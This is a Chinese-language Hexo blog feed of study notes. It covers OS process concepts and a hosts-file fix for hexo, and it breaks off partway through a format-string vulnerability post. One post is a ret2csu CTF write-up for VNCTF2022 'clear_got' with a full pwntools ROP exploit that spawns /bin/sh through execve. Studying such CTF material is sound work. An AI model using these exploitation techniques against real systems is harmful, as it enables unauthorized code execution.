        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="最大限度利用CPU"><a href="#最大限度利用CPU" class="headerlink" title="最大限度利用CPU"></a>最大限度利用CPU</h2><p>&emsp;&emsp;在计算机发展早期，CPU资源十分宝贵，如果一个CPU只能运行一个程序，那么当这个程序读写磁盘是，CPU就闲下来了，这在当时无异于暴殄天物，于是人们编写了一个监控程序，当某个程序暂时不使用CPU时，监控程序就把另一个在等待CPU资源的程序启动，使CPU得以充分利用，这种方法被称为<strong>多道程序（Multiprogramming）</strong>，原始但是有效，但其有个问题就是程序的执行不分轻重缓急，调度策略太过于粗糙，当多个程序同时运行时，容易出现问题，有一些急需处理的程序可能要等到很久以后才能分配到CPU，<del>比如当你当你点击鼠标，但是要等个十分钟才有响应，这是很难受的</del><br>&emsp;&emsp;稍作改进，让程序运行模式变成一种协作模式，即程序使用一段时间的CPU后会主动让出，这种程序协作模式叫做<strong>分时系统（Time-Sharing System）</strong>,<br>此时完整的操作系统雏形已经逐渐形成，不过这种方式也存在问题，如果此时某项程序正在进行一项耗时的计算，霸占着CPU不放，那么其他程序只能等待，整个系统看上去就好像“死机”了一样。<br>&emsp;&emsp;于是我们再进行改进，直到现在我们熟悉的<strong>多任务（Multi-tasking）系统</strong>。操作系统接管了所有的硬件资源，并且本身运行在一个受硬件保护的级别。所有的应用程序都以<strong>进程（Process）</strong>的方式运行在比操作系统更低的级别，每个进程都有自己独立的地址空间，使得进程之间的地址空间相互隔离，每个进程根据进程优先级的高低都有机会得到CPU。但是,如果运行时间超出了一定的时间，操作系统会强制暂停该进程，将CPU资源分配给其他等待运行的进程。这种CPU分配方式称为<strong>抢占式</strong>。操作系统可以强制剥夺CPU资源并且分配给它认为目前最需要CPU的进程。如果操作系统分配给每个进程的时间都很短，即CPU在多个进程间快速地切换，就能造成了很多进程都在同时运行的假象（即<strong>伪并行</strong>(pseudoparallelism) ）。</p><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p>操作系统中的进程是指正在执行的程序的实例。进程是计算机系统中的基本执行单位，它具有独立的内存空间和执行状态。</p><hr><p>在网上看到一个有意思的比喻：<br>&emsp;&emsp;想想一位会做饭的计算机科学家正在为他的女儿制作生日蛋糕。他有做生日蛋糕的食谱，厨房里有所需的原料：面粉、鸡蛋、糖、香草汁等。在这个比喻中，做蛋糕的食谱就是程序、计算机科学家就是 CPU、而做蛋糕的各种原料就是输入数据。进程就是科学家阅读食谱、取来各种原料以及烘焙蛋糕等一系列动作的总和。<br>&emsp;&emsp;现在假设科学家的儿子跑过来告诉他，说他的头被蜜蜂蜇了一下，那么此时科学家会记录出来他做蛋糕这个过程到了哪一步，然后拿出急救手册，按照上面的步骤给他儿子实施救助。这里，会涉及到进程之间的切换，科学家（CPU）会从做蛋糕（进程）切换到实施医疗救助（另一个进程）。等待伤口处理完毕后，科学家会回到刚刚记录做蛋糕的那一步，继续制作。</p><hr><h3 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a>进程状态</h3><p>在操作系统中，进程可以处于不同的状态，这些状态反映了进程在执行过程中的不同情况和条件。<br>常见的进程状态包括：<br>1.<strong>新建（New）</strong>：进程刚被创建但还未被操作系统接受和分配资源。<br>2.<strong>就绪（Ready）</strong>：进程已经准备好执行并等待分配处理器资源。<br>3.<strong>运行（Running）</strong>：进程正在执行中，占用CPU资源。<br>4.<strong>阻塞（Blocked）</strong>：进程因为某些原因而无法继续执行，例如等待某个事件发生、等待输入&#x2F;输出完成或等待资源释放。<br>5.<strong>终止（Terminated）</strong>：进程的执行已经结束，可能是正常结束或异常结束。</p><h3 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h3><p>进程控制是指操作系统对进程进行创建、终止、暂停、恢复和调度等操作的管理和控制。通过进程控制，操作系统可以有效地管理进程的执行，分配资源并确保系统的正常运行。</p><p><em>进程创建</em></p><p>操作系统允许用户或其他进程创建新的进程。进程创建的过程中，操作系统会为新进程分配资源，包括内存空间、文件描述符、进程控制块等。操作系统还会为新进程设置初始状态和上下文，并将其加入进程调度队列中等待执行。</p><p><em>进程终止</em></p><p>进程可以正常终止，也可以由于错误、异常或用户请求而被强制终止。当一个进程终止时，操作系统会回收其占用的资源，释放内存空间，并更新相应的数据结构。此外，操作系统还会通知相关进程或用户进程的终止事件。</p><p><em>进程暂停和恢复</em></p><p>操作系统可以暂停一个正在运行的进程，使其暂时停止执行。进程暂停的原因可以是等待某个事件的发生，如等待 I&#x2F;O 操作完成。一旦等待的事件发生，操作系统会恢复进程的执行，使其继续运行。</p><p><em>进程调度</em></p><p>操作系统通过<u>进程调度算法</u>决定哪些进程获得 CPU 时间片并在运行态执行。调度算法可以根据进程的优先级、时间片轮转等策略来决定进程的执行顺序。进程调度的目标是实现公平性、高性能和响应时间的平衡。</p><h3 id="进程间通信"><a href="#进程间通信" class="headerlink" title="进程间通信"></a>进程间通信</h3><p>进程间通信（Inter-Process Communication，IPC）是指在操作系统中，不同进程之间进行数据交换、信息传递和协作的机制。进程间通信允许进程之间<u>共享数据、同步操作和相互通知</u>，以实现任务的协同完成。<br>实现方式（常见）：<br>1.<strong>管道（Pipe）</strong>：管道是一种半双工<sup>[1]</sup>的通信机制，用于在具有亲缘关系的两个进程之间进行通信。管道有两种类型：无名管道（Anonymous Pipe）和命名管道（Named Pipe）。无名管道用于父子进程之间的通信，而命名管道允许无关进程之间的通信。<br>2.<strong>共享内存（Shared Memory）</strong>：共享内存是一种高效的进程间通信方式，它允许多个进程访问<u>同一块内存区域</u>。进程可以将共享内存映射到它们的地址空间中，从而可以直接读写共享数据，而无需进行数据复制。共享内存需要使用同步机制（如信号量）来协调进程对共享数据的访问。<br>3.<strong>信号量（Semaphore）</strong>：信号量是一种用于进程间同步的机制。它可以用来实现进程的互斥访问共享资源和进程的同步操作。信号量维护一个计数器，进程可以对信号量进行等待（阻塞）和释放（唤醒）操作，以控制对共享资源的访问。（<em>具体后面进程互斥会提到，先留个印象</em>）<br>4.<strong>消息队列（Message Queue）</strong>：消息队列<sup>[2]</sup>是一种基于消息的进程间通信方式。进程可以将消息发送到队列中，并由其他进程从队列中接收消息。消息队列可以实现进程之间的异步通信，进程可以按照自己的节奏发送和接收消息，而不需要进行直接的同步等待。<br>5.<strong>套接字（Socket）</strong>：套接字是一种用于网络通信的通用接口，它也可以用于进程间通信。进程可以通过套接字进行网络通信，也可以在同一台计算机上的不同进程之间进行进程间通信。套接字提供了一种可靠的、面向连接的通信方式。</p><p>[1] <em>半双工（Half-Duplex）通信机制是指通信双方可以交替地发送和接收数据，但不能同时进行发送和接收。比喻起来，可以将半双工通信类比为对话中的单向讲话。当一个人在说话时，另一个人必须静默等待，然后才能回应。在这种情况下，每个人都可以发送和接收信息，但不能同时进行。相比于半双工，全双工通信则允许通信双方同时发送和接收数据。</em><br>[2] <em>消息队列通常由消息生产者、消息队列和消息消费者组成。简单的来说，消息生产者给出消息，消息队列存放消息，消息消费者根据需求接受消息。对应上文，进程既可以当消息生产者，也可以当消息消费者</em></p><h3 id="进程互斥"><a href="#进程互斥" class="headerlink" title="进程互斥"></a>进程互斥</h3><p>进程互斥是指多个进程在访问共享资源时的一种机制，旨在<u>防止多个进程同时访问或修改同一个共享资源，从而避免数据不一致或竞争条件的发生</u>。在并发执行的环境中，多个进程可能会同时访问共享资源，比如共享内存区域、文件、设备等。如果没有适当的互斥机制，就有可能导致数据损坏、竞争条件和不确定性的问题。<br>实现（常见）：<br>1.<strong>互斥锁（Mutex）</strong>：互斥锁是最常用的进程互斥机制之一。它是一种二进制标志，且只有一个进程可以持有互斥锁，每个共享资源都有一个关联的互斥锁。在访问共享资源之前，进程需要先尝试获取互斥锁。如果互斥锁已经被其他进程持有，则当前进程会被阻塞，直到互斥锁被释放。一次只有一个进程能够持有互斥锁，确保了对共享资源的互斥访问。<br>2.<strong>条件变量（Condition Variable）</strong>：条件变量用于进程之间的通信和同步，它允许一个进程等待某个条件满足后再继续执行。条件变量通常与互斥锁一起使用<sup>[3]</sup>，确保在等待条件时不会发生竞争条件。<br>3.<strong>信号量（Semaphore）</strong>：信号量是一种计数器，用于控制同时访问共享资源的进程数量。它可以用来实现互斥和同步。当进程需要访问共享资源时，在访问之前会尝试对信号量进行减操作，如果减操作的结果小于零，则当前进程会被阻塞，直到其他进程释放了信号量。（举个栗子：假设刚开始信号量的值为3，说明此时该共享资源允许有三个进程同时访问它，每多一个进程正在访问它，信号量的值就减一，直到其值为0，此时已经满了，若再来一个进程，进行减操作后发现结果小于0，那么该进程就会被阻塞，不让它访问）<br>4.<strong>读写锁（ReadWrite Lock）</strong>：读写锁允许多个进程同时读取共享资源，但只允许一个进程进行写操作。这种机制适用于读取频繁、写入较少的场景，可以提高并发性能。<br>[3] <em>条件变量的使用通常遵循以下模式：(1)进程获取互斥锁。(2)进程检查某个条件是否满足，如果不满足，则调用等待操作，释放互斥锁，并进入阻塞状态。(3)其他进程在一定条件下修改共享资源，并通过通知操作唤醒等待的线程。(4)被唤醒的进程重新获取互斥锁，继续执行。</em></p><h3 id="进程同步"><a href="#进程同步" class="headerlink" title="进程同步"></a>进程同步</h3><p>进程同步是指多个进程之间协调和控制彼此的执行顺序，以确保它们按照预期的方式进行交互和共享资源。进程同步的目的是避免竞争条件、数据不一致和其他并发问题。在并发环境中，多个进程同时执行，彼此之间的执行顺序是不确定的。这可能会导致一些问题，比如竞态条件（Race condition）<sup>[4]</sup>、死锁（Deadlock）<sup>[5]</sup>和活锁（Livelock）<sup>[6]</sup>等。为了解决这些问题，需要使用适当的进程同步机制。<br>实现（常见）：<br>1.<strong>信号量（Semaphore）</strong><br>2.<strong>互斥锁（Mutex）</strong><br>3.<strong>条件变量（Condition Variable）</strong><br>4.<strong>读写锁（ReadWrite Lock）</strong><br>5.<strong>屏障（Barrier）</strong>：屏障用于确保多个进程在并发执行过程中达到某个同步点之前都会等待。当所有进程都到达屏障点后，它们才能继续执行。</p><hr><p><em>可以说进程互斥是进程同步的一种特殊情况。进程同步更广泛地涵盖了进程之间协调和控制的方方面面，包括确保进程按照预期的顺序执行、等待其他进程完成某个操作、通知其他进程等。而进程互斥仅关注在多个进程访问共享资源时的互斥访问问题。</em></p><hr><p>[4] <em>竞态条件（Race Condition）是指在多线程或多进程环境中，由于多个线程或进程之间的执行顺序不确定而导致的问题。这种不确定性可能会导致共享资源的访问和修改顺序与预期不符，从而导致程序产生不正确的结果。</em><br><em>举个栗子</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BankAccount</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.balance = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">deposit</span>(<span class="params">self, amount</span>):</span><br><span class="line">        current_balance = <span class="variable language_">self</span>.balance</span><br><span class="line">        current_balance += amount</span><br><span class="line">        <span class="variable language_">self</span>.balance = current_balance</span><br></pre></td></tr></table></figure><p>假设有两个线程同时执行以下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">account = BankAccount()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 线程1的操作</span></span><br><span class="line">thread1:</span><br><span class="line">    account.deposit(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 线程2的操作</span></span><br><span class="line">thread2:</span><br><span class="line">    account.deposit(<span class="number">200</span>)</span><br></pre></td></tr></table></figure><p><em>在单线程情况下，期望的结果是账户余额增加到300。但是，由于线程1和线程2是并行执行的，存在竞态条件，可能导致以下情况发生：</em><br><em>线程1读取账户余额为0。</em><br><em>线程2读取账户余额为0。</em><br><em>线程1计算新余额为100。</em><br><em>线程2计算新余额为200。</em><br><em>线程1更新账户余额为100。</em><br><em>线程2更新账户余额为200。</em><br><em>在这种情况下，账户余额只增加到了200，而不是期望的300。这是因为两个线程同时读取了账户余额，进行了计算和更新操作，导致竞态条件产生。</em></p><p>[5] <em>死锁（Deadlock）是指在并发系统中，两个或多个进程或线程因互相等待对方释放资源而造成的一种僵持状态，导致它们无法继续执行下去。死锁形成需满足四个条件：</em><br><em>1.互斥条件（Mutual Exclusion）：至少有一个资源被标记为独占性资源，同一时间只能被一个进程或线程占用。</em><br><em>2.占有和等待条件（Hold and Wait）：进程或线程至少已经持有一个资源，同时还在等待获取其他进程或线程占用的资源。</em><br><em>3.不可剥夺条件（No Preemption）：已经占有的资源不能被其他进程或线程强制性地剥夺，只能在自愿释放后才能让其他进程使用。</em><br><em>4.循环等待条件（Circular Wait）：存在一个进程或线程的资源请求链，形成一个循环等待的环路。</em><br><em>条件2、3和4简单理解就是：现有进程abc，分别占有资源123，且a还需2才能执行，b还需3才能执行，c还需1才能执行，他们都在等待对方让出资源，然后就会陷入死循环，无限等待</em><br><em>预防死锁只需破坏四个条件其中之一即可</em></p><p>[6] <em>活锁（Livelock）是一种类似于死锁的情况，其中多个进程或线程在<u>相互响应对方的动作</u>时陷入无限循环，导致它们无法继续向前推进或完成任务。在活锁中，进程或线程一直在不停地改变自己的状态以避免冲突，但是它们无法取得进展。这种情况下，虽然进程或线程没有被阻塞，但它们却无法完成所需的工作。</em><br><em>简单来说，发生死锁时进程等的是对方的资源，发生活锁时进程等的是对方的动作或响应，也是一个互相等待的过程</em></p><h2 id="临界区"><a href="#临界区" class="headerlink" title="临界区"></a>临界区</h2><p>&emsp;&emsp;临界区（Critical Section）是指在多线程或多进程环境中，访问共享资源或共享数据的那部分<u>代码区域</u>。在临界区内，只允许一个线程或进程访问共享资源，其他线程或进程必须等待。<br>&emsp;&emsp;临界区的目的是确保在并发访问共享资源时的数据一致性和正确性。当多个线程或进程需要同时访问共享资源时，如果不进行同步控制，就可能会导致数据竞争和错误的结果。通过将访问共享资源的代码包裹在临界区中，可以保证同一时间只有一个线程或进程可以执行临界区内的代码，从而避免竞争条件的发生。<br>使用临界区时，需要注意以下几点：<br>·互斥访问：临界区内的代码需要通过互斥机制（如互斥锁、信号量等）来确保在任意时刻只有一个线程或进程可以执行临界区内的代码。<br>·尽量减少临界区的长度：临界区的长度越长，其他线程或进程就需要等待更长的时间才能访问共享资源，可能导致性能下降。因此，应尽量将临界区的长度缩短，只包含必要的代码。<br>·避免死锁：如果多个线程或进程相互等待对方释放资源，可能导致死锁。因此，在设计临界区时，需要合理设置同步机制，避免死锁情况的发生。<br>·公平性：在多线程环境中，应该考虑公平性，即每个线程都有机会访问临界区，避免某个线程长时间占据临界区而导致其他线程无法访问。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统 进程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2csu</title>
      <link href="/2024/04/01/ret2csu/"/>
      <url>/2024/04/01/ret2csu/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>漏洞来源于_libc_csu_init 这个文件，它原本是用于对程序进行初始化，但是它的一些代码片段可以被我们利用<br>如图<br><img src="https://gateway.pinata.cloud/ipfs/bafkreifmbh4bsjeeeghax7oawvmrsnmfurvooxjy47xxj4szjkrcnz5dca" alt="1"></p><p>下面我们将0x4007d0 - 0x4007e4的片段称为gadget2，0x4007e6 - 0x4007f4的片段称为gadget1<br>利用gadget1，我们可以实现：对rbx,rbp,r12,r13,r14,r15传参<br>利用gadget2，我们可以实现：将r13的值赋给rdx，将r14的值赋给rsi，将r15d的值赋给edi<br>即我们可以对rbx，rbp，r12，rdx，rsi，edi传参</p><p>注意这段汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmp     rbx, rbp</span><br><span class="line">jnz     short loc_4007D0</span><br></pre></td></tr></table></figure><p>它的作用是比较rbx和rbp的值，如果二者<strong>不相等</strong>，就跳转到loc_4007D0这个位置，我们一般不希望它跳转，所以我们一般令rbp&#x3D;1，rbx&#x3D;0（因为上一句汇编是add  rbx, 1  ，即使rbx的值加1）</p><hr><p><em>补充：r15d和rdi都是r15的低32位部分，区别在于，r15d用于32位模式（指处理器模式而不是操作系统架构！！），rdi用于64位模式，并且RDI可以访问更大的内存空间</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]</span><br></pre></td></tr></table></figure><p>ds: 是段寄存器前缀，用于指定数据段寄存器。它表示要访问的数据存储在数据段中。这句汇编代码的意思是call __frame_dummy_init_array_entry - 600E10h这个地址的函数，该地址通过r12+rbx*8计算得出，并且数据存储在数据段中。</p><hr><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><strong>VNCTF2022公开赛clear_got</strong></p><p><img src="https://gateway.pinata.cloud/ipfs/bafkreiatod7ncwgjyitt7kf6nu7o6n3pn2otjsexprqq6fh5povw66wmam" alt="1"></p><p><img src="https://gateway.pinata.cloud/ipfs/bafkreif75gwqjuixh3lufrayfpdeyg3q36pxlpj6egtowwtswp7md7hdxe" alt="2"></p><p>可以看到存在栈溢出，无binsh字段，无system函数,开启了nx保护<br>注意这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(&amp;qword_601008, <span class="number">0</span>, <span class="number">0x38</span>uLL);</span><br></pre></td></tr></table></figure><p>它将&amp;qword_601008往上0x38大小的数据覆写为0，即下面这段数据<br><img src="https://gateway.pinata.cloud/ipfs/bafkreicguin2eakqnkpb4qo5g4evtnd5tjuyyikef6ojo6qvnndqn53ouq" alt="1"><br>发现这段数据是got表的内容，即函数执行到这里，got表的内容就被清空了<br>于是我们考虑利用系统调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure><p>64位下，其调用号为0x3b<br>回顾一下：x86_64：syscall调用号存放于rax  syscall参数（传参顺序）：rdi rsi rdx r10 r8 r9</p><p>首先我们要能控制rax，其次往.bss段写入’&#x2F;bin&#x2F;sh’，最后分别控制rdi和rsi</p><h3 id="如何控制rax？"><a href="#如何控制rax？" class="headerlink" title="如何控制rax？"></a>如何控制rax？</h3><p><em>就本题而言，没有出现’pop rax ret’字段，所以我们要另辟蹊径</em></p><blockquote></blockquote><pre><code>*调用 read 函数*mov rax, 0      ; 系统调用号为 0 表示 readmov rdi, fd     ; 文件描述符mov rsi, buf    ; 缓冲区地址mov rdx, buf_len ; 读取的最大字节数syscall*检查返回值*cmp rax, 0      ; 如果 rax 大于 0，则表示成功读取了字节数jl error        ; 如果 rax 小于 0，则表示发生了错误; 在这里可以处理读取的数据*正常退出*mov eax, 60     ; 系统调用号为 60 表示 exitxor edi, edi    ; 退出码为 0syscall</code></pre><blockquote></blockquote><p><em>write同理</em><br>可以看出在x86_64架构下，<strong>read和write函数的返回值会存放在rax寄存器</strong>，所以我们可以利用这两个函数来控制rax</p><hr><p>康康gadget<br><img src="https://gateway.pinata.cloud/ipfs/bafkreiclisxzqp2qbggusfz3ibx3g6iurgxjgcvjlcmucbcsck32uzzb7u" alt="0"><br>一堆r12 13啥啥的，所以我们得利用_libc_csu_init 来构造rop链</p><p>在x86_64架构下，main函数的返回值通常存放在寄存器 rax 中,而main函数正常执行最后有return 0，故rax里面已经存放着0，并且read函数的系统调用号刚好是0，所以我们可以直接syscall read</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># io=remote(&quot;node5.buuoj.cn&quot;,27990)</span></span><br><span class="line">io=process(<span class="string">&quot;./clear_got&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">104</span></span><br><span class="line">syscall_addr=<span class="number">0x040077E</span></span><br><span class="line">gadget1=<span class="number">0x04007Ea</span> <span class="comment">## 不能是0x4007e6 即不包括&#x27;add rsp, 8&#x27;这句汇编</span></span><br><span class="line">gadget2=<span class="number">0x04007D0</span></span><br><span class="line">tem_proc=<span class="number">0x600e48</span> <span class="comment">#用ida看到的tem_proc地址是0x0400804，我们利用gdb的search -p 0x0400804 就可以查出指向该地址的地址（为啥要该地址的地址下面会讲）</span></span><br><span class="line">bss_addr=<span class="number">0x0601060</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(offset) <span class="comment">##栈溢出</span></span><br><span class="line">payload+=p64(gadget1) <span class="comment">#ret</span></span><br><span class="line">payload+=p64(<span class="number">0</span>) <span class="comment">#rbx</span></span><br><span class="line">payload+=p64(<span class="number">1</span>) <span class="comment">#rbp</span></span><br><span class="line">payload+=p64(tem_proc+<span class="number">0x8</span>) <span class="comment">#r12 使得gadget2中的call指令call的是temproc这个空函数，避免造成影响，0x8 对应 rbx*8   想要用call去跳转到一个地址A，那就必须用一个指向地址A的地址B放到call后面</span></span><br><span class="line">payload+=p64(<span class="number">59</span>) <span class="comment"># r13——&gt;rdx 59为execve 在64位架构下的系统调用号   *读取的最大字节数 ；读取成功后，read函数将返回一个 ssize_t 类型的值，表示实际读取的字节数，即我们这里填入的59</span></span><br><span class="line">payload+=p64(bss_addr) <span class="comment">#r14——&gt;rsi 传参,我们要利用read往bss段写入&#x27;binsh&#x27;   *缓冲区地址</span></span><br><span class="line">payload+=p64(<span class="number">0</span>) <span class="comment">#r15(r15d)——&gt;edi  *文件描述符</span></span><br><span class="line">payload+=p64(gadget2) <span class="comment">#ret</span></span><br><span class="line">payload+=<span class="string">b&#x27;B&#x27;</span>*<span class="number">8</span>  <span class="comment">#覆盖 add rsp, 8</span></span><br><span class="line">payload+=p64(<span class="number">0</span>) <span class="comment">#rbx</span></span><br><span class="line">payload+=p64(<span class="number">1</span>) <span class="comment">#rbp</span></span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x8</span>) <span class="comment">#r12  利用call函数来执行填入到.bss段里的syscall</span></span><br><span class="line">payload+=p64(<span class="number">0</span>) <span class="comment">#r13——&gt;rdx</span></span><br><span class="line">payload+=p64(<span class="number">0</span>) <span class="comment">#r14——&gt;rsi</span></span><br><span class="line">payload+=p64(bss_addr) <span class="comment">#r15(r15d)——&gt;edi</span></span><br><span class="line">payload+=p64(syscall_addr) <span class="comment">#ret,之后程序会进行系统调用read函数 之后rax的值就变成59</span></span><br><span class="line">payload+=p64(gadget2) <span class="comment">#syscall后的ret</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;Welcome to VNCTF! This is a easy competition.///\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(syscall_addr)+<span class="string">b&#x27;\x00&#x27;</span>.ljust(<span class="number">59</span>,<span class="string">b&#x27;\x00&#x27;</span>)<span class="comment">#往.bss段写入&#x27;/bin/sh&#x27;，这里一定要凑齐59，使得read函数的返回值，也就是让rax变成59</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Stack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo推送文章失败解决方案</title>
      <link href="/2024/04/01/hexo%E6%8E%A8%E9%80%81%E6%96%87%E7%AB%A0%E5%A4%B1%E8%B4%A5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
      <url>/2024/04/01/hexo%E6%8E%A8%E9%80%81%E6%96%87%E7%AB%A0%E5%A4%B1%E8%B4%A5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p><em>网上的一些常规解决方法可以先试试</em><br><em>这边记录一下试验成功的一个方法</em></p><p>往本地的host文件中添加GitHub的ip<br>格式如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">140.82.114.4 github.com</span><br></pre></td></tr></table></figure><p><em>关于如何查GitHub的ip</em></p><p>可以使用在线的DNS解析工具<br>MXtoolbox (<a href="https://mxtoolbox.com/DNSLookup.aspx">https://mxtoolbox.com/DNSLookup.aspx</a>): MXtoolbox提供了各种网络工具，包括DNS解析工具。在其DNS Lookup页面上，你可以输入域名并选择查询类型（如A记录、CNAME记录、MX记录等），然后点击”DNS Lookup”按钮来执行DNS查询并获取IP地址。</p><p>DNS Checker (<a href="https://dnschecker.org/">https://dnschecker.org/</a>): DNS Checker是一个简单易用的在线DNS解析工具。你只需输入域名，选择查询类型，并点击”Go”按钮来进行DNS查询。它将显示相关的DNS记录，包括IP地址、TTL（Time To Live）值等。</p><p>DNS Lookup (<a href="https://dns-lookup.com/">https://dns-lookup.com/</a>): DNS Lookup提供了一个简单的界面来执行DNS查询。你可以输入域名并选择查询类型，然后点击”Lookup”按钮来获取IP地址和其他相关信息。</p><p>Network Tools by Google Cloud (<a href="https://toolbox.googleapps.com/apps/dig/">https://toolbox.googleapps.com/apps/dig/</a>): Google Cloud的Network Tools提供了各种网络工具，其中包括DIG工具用于执行DNS查询。你可以在该页面上输入域名并选择查询类型，然后点击”Run Query”来获取DNS记录和IP地址。</p>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串漏洞</title>
      <link href="/2024/03/26/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/03/26/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h2><p>漏洞来自c语言的printf函数，因为printf函数不会检查参数的个数与格式化字符串的个数是否对应，也就是说，只要有格式化参数在，即使我们没有往printf函数传去参数，它也会默认在栈上向后（向高地址）寻找对应参数并根据格式化字符串来解析，举个栗子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prinf(<span class="string">&quot;%s%s%s&quot;</span>);</span><br></pre></td></tr></table></figure><p>我们虽然没有给printf传参，但它依旧会把后面地址（高地址）上的内容作为参数来使用，栈的情况如下图</p><p><img src="https://gateway.pinata.cloud/ipfs/bafkreicjvfhpvfgoxudw334wn632junbgjo7ro2e33n74chpy22k2f7gxe" alt="stack"></p><p>可以看到，格式化字符串的内容也是放在了栈上，因为我们没有传参，所以printf会把0xffffada8、0xffffada9、0xffffadaa作为参数，根据%s，将其解析并以字符串形式输出<br>有如下语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(buf);</span><br></pre></td></tr></table></figure><p>如果我们能控制buf的内容，就可以利用格式字符串漏洞</p><h2 id="格式化字符串漏洞利用"><a href="#格式化字符串漏洞利用" class="headerlink" title="格式化字符串漏洞利用"></a>格式化字符串漏洞利用</h2><h3 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h3><p>就像上面举的例子，我们只要多写几个%s，就可将栈上的内，容解析并以字符串形式输出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span 